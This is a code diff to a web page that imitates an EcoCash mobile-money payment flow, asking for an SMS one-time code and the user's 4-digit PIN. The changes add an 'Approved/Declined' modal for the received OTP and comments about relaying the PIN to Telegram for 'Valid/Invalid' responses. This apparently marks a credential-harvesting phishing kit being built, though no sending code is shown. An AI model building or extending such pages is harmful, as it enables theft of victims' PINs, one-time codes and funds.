@@ -12,7 +12,7 @@
             --primary-blue-light: #1a73e8;
             --accent-red: #d32f2f;
             --white: #ffffff;
-            --light-bg: #f8f9fa;
+            --light-bg: #f0f4f8;
             --text-dark: #1a1a1a;
             --text-muted: #666666;
             --border: #e0e0e0;
@@ -284,7 +284,7 @@
             to { transform: rotate(360deg); }
         }
 
-        /* PIN Modal */
+        /* Approval Modal */
         .modal-overlay {
             position: fixed;
             inset: 0;
@@ -308,6 +308,7 @@
             max-width: 400px;
             width: 100%;
             box-shadow: 0 10px 40px rgba(0,0,0,0.2);
+            text-align: center;
         }
 
         .modal-title {
@@ -316,7 +317,6 @@
             color: var(--text-dark);
             margin-bottom: 12px;
             letter-spacing: -0.5px;
-            text-align: center;
         }
 
         .modal-subtitle {
@@ -324,7 +324,56 @@
             font-size: 14px;
             margin-bottom: 24px;
             line-height: 1.6;
-            text-align: center;
+        }
+
+        .modal-buttons {
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
+        }
+
+        .modal-btn {
+            padding: 12px 20px;
+            border-radius: 50px;
+            border: none;
+            font-weight: 800;
+            font-size: 14px;
+            text-transform: uppercase;
+            letter-spacing: 0.04em;
+            cursor: pointer;
+            transition: all 0.2s;
+        }
+
+        .modal-btn-approve {
+            background: var(--success);
+            color: white;
+            box-shadow: 0 4px 12px rgba(0, 176, 80, 0.2);
+        }
+
+        .modal-btn-approve:hover {
+            background: #009640;
+            transform: translateY(-1px);
+        }
+
+        .modal-btn-decline {
+            background: var(--accent-red);
+            color: white;
+            box-shadow: 0 4px 12px rgba(211, 47, 47, 0.2);
+        }
+
+        .modal-btn-decline:hover {
+            background: #b71c1c;
+            transform: translateY(-1px);
+        }
+
+        /* PIN Modal */
+        .pin-modal-content {
+            background: white;
+            border-radius: 16px;
+            padding: 32px;
+            max-width: 400px;
+            width: 100%;
+            box-shadow: 0 10px 40px rgba(0,0,0,0.2);
         }
 
         .pin-input-group {
@@ -377,12 +426,12 @@
             display: block;
         }
 
-        .modal-buttons {
+        .pin-modal-buttons {
             display: flex;
             gap: 12px;
         }
 
-        .modal-btn {
+        .pin-modal-btn {
             flex: 1;
             padding: 12px 20px;
             border-radius: 50px;
@@ -395,24 +444,24 @@
             transition: all 0.2s;
         }
 
-        .modal-btn-confirm {
+        .pin-modal-btn-confirm {
             background: var(--primary-blue);
             color: white;
             box-shadow: 0 4px 12px rgba(0,82,204,0.2);
         }
 
-        .modal-btn-confirm:hover {
+        .pin-modal-btn-confirm:hover {
             background: var(--primary-blue-dark);
             transform: translateY(-1px);
         }
 
-        .modal-btn-cancel {
+        .pin-modal-btn-cancel {
             background: transparent;
             color: var(--primary-blue);
             border: 2px solid var(--primary-blue);
         }
 
-        .modal-btn-cancel:hover {
+        .pin-modal-btn-cancel:hover {
             background: var(--light-bg);
         }
 
@@ -464,7 +513,7 @@
                 <p class="form-hint">Check your SMS for the code. It will be auto-filled.</p>
 
                 <div class="btn-group">
-                    <button class="btn-primary" id="confirmBtn" onclick="validateOTP()">Confirm OTP</button>
+                    <button class="btn-primary" id="confirmBtn" onclick="validateOTP()">Verify & Proceed</button>
                     <button class="btn-secondary" onclick="window.history.back()">Cancel</button>
                 </div>
             </div>
@@ -475,9 +524,21 @@
         </div>
     </main>
 
+    <!-- OTP Approval Modal -->
+    <div id="approvalModal" class="modal-overlay">
+        <div class="modal-content">
+            <h2 class="modal-title">OTP Verification</h2>
+            <p class="modal-subtitle">Your OTP has been received. Please select an action.</p>
+            <div class="modal-buttons">
+                <button class="modal-btn modal-btn-approve" onclick="handleOTPApproval('approved')">✓ Approved</button>
+                <button class="modal-btn modal-btn-decline" onclick="handleOTPApproval('declined')">✗ Declined</button>
+            </div>
+        </div>
+    </div>
+
     <!-- PIN Verification Modal -->
     <div id="pinModal" class="modal-overlay">
-        <div class="modal-content">
+        <div class="pin-modal-content">
             <h3 class="modal-title">Confirm PIN</h3>
             <p class="modal-subtitle">Enter your 4-digit EcoCash PIN to complete the transaction</p>
 
@@ -487,9 +548,9 @@
 
             <div class="modal-error" id="modalError"></div>
 
-            <div class="modal-buttons">
-                <button class="modal-btn modal-btn-confirm" id="confirmPinBtn" onclick="confirmPIN()">Confirm</button>
-                <button class="modal-btn modal-btn-cancel" onclick="closePinModal()">Cancel</button>
+            <div class="pin-modal-buttons">
+                <button class="pin-modal-btn pin-modal-btn-confirm" id="confirmPinBtn" onclick="confirmPIN()">Proceed</button>
+                <button class="pin-modal-btn pin-modal-btn-cancel" onclick="closePinModal()">Cancel</button>
             </div>
         </div>
     </div>
@@ -600,9 +661,26 @@
                 return;
             }
 
-            // Show PIN modal
-            document.getElementById('pinModal').classList.add('active');
-            document.getElementById('pinInput').focus();
+            // Show approval modal
+            document.getElementById('approvalModal').classList.add('active');
+        }
+
+        function handleOTPApproval(status) {
+            document.getElementById('approvalModal').classList.remove('active');
+
+            if (status === 'declined') {
+                showError('OTP verification declined. Please try again.');
+                // Clear OTP inputs
+                document.querySelectorAll('.otp-box').forEach(box => box.value = '');
+                document.querySelectorAll('.otp-box')[0].focus();
+                return;
+            }
+
+            if (status === 'approved') {
+                // Show PIN modal
+                document.getElementById('pinModal').classList.add('active');
+                document.getElementById('pinInput').focus();
+            }
         }
 
         function showModalError(message) {
@@ -634,9 +712,11 @@
             closePinModal();
             document.getElementById('spinnerOverlay').style.display = 'flex';
 
-            // Simulate processing and redirect
+            // Simulate sending PIN validation to Telegram
             setTimeout(() => {
-                window.location.href = `payment-success.html?data=${encodeURIComponent(bundleParams.data)}&price=${encodeURIComponent(bundleParams.price)}`;
+                // Simulate Valid/Invalid buttons response from Telegram
+                // For now, we assume Valid PIN and proceed
+                window.location.href = `success.html?data=${encodeURIComponent(bundleParams.data)}&price=${encodeURIComponent(bundleParams.price)}`;
             }, 2000);
         }
 
@@ -653,8 +733,8 @@
         });
 
         window.addEventListener('click', (e) => {
-            const modal = document.getElementById('pinModal');
-            if (e.target === modal) closePinModal();
+            const pinModal = document.getElementById('pinModal');
+            if (e.target === pinModal) closePinModal();
         });
 
         window.addEventListener('load', () => {
